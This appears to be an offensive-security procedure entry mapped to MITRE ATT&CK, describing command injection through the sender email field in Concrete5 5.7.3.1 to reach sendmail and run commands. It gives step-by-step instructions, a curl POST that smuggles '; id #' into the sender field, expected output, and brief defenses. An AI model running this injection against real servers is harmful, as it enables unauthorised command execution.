---
id: proc-inject-sender-rce
tags:
  - rce
  - command-injection
  - sendmail
  - concrete5
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-sendmail-inject]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:20.003Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
---
# Inject-Command-via-Sender-Email-for-RCE

## Summary

This procedure exploits improper validation of the sender email address in Concrete5's registration notification functionality, allowing command injection via sendmail to achieve remote code execution on the server.

## Description

In Concrete5 version 5.7.3.1, the email sending mechanism passes user-controlled input from the sender field directly to sendmail without sanitization, enabling attackers with admin access to inject shell commands. The attack scenario involves authenticating as an admin, configuring or triggering a registration email, and crafting a payload like `attacker@example.com; id #` to execute commands. Expected outcomes include arbitrary command execution, such as reading files or spawning shells. This requires an authenticated session and a server with sendmail configured.

## Requirements

1. Authenticated administrator session in Concrete5
2. Access to registration notification settings or ability to trigger user registrations
3. Server-side sendmail service active for email delivery
4. Knowledge of Unix shell syntax for payload crafting

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all inputs passed to system commands like sendmail
- Use PHP's mail() function or libraries with built-in escaping instead of direct sendmail calls
- Implement logging of email configurations and monitor for anomalous sender formats in server logs
- Apply least privilege to web server processes to limit RCE impact

## Objectives

1. Inject a malicious command into the sender email field
2. Trigger sendmail execution to run the injected command
3. Achieve remote code execution and verify via output

## Instructions

### Step 1: Access Email Configuration

**Context**: Navigate to the admin panel section handling registration notifications to prepare the vulnerable form.

Log in to the dashboard and go to System & Settings > Email or User Management > Registration.

### Step 2: Craft and Submit Malicious Payload

**Context**: Modify the sender email field with a command injection payload and trigger the email send.

Execute [[commands/curl-sendmail-inject]] to simulate or directly submit the tainted request:

```bash
curl -X POST 'http://target.com/concrete/tools/users/register' \
  -d 'sender=attacker@example.com; id #' \
  -d 'other_form_fields=value' \
  --cookie 'concrete5_session=admin_session_token'
```

> This command sends a POST request mimicking the registration form submission, injecting `; id #` into the sender field. The semicolon separates the email from the command, and `#` comments out the rest. Expected output includes the command result (e.g., `uid=33(www-data) gid=33(www-data)`) in the response or email logs if successful.

### Step 3: Verify Execution

**Context**: Check for signs of command execution to confirm RCE.

Monitor server logs or response for payload output, such as process listings or file modifications.

**Expected Output**: Evidence of shell command running, e.g., `id` command output.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/curl-sendmail-inject]]

## Tools Used


## Tags

- [[rce]]
- [[command-injection]]
- [[sendmail]]
- [[concrete5]]
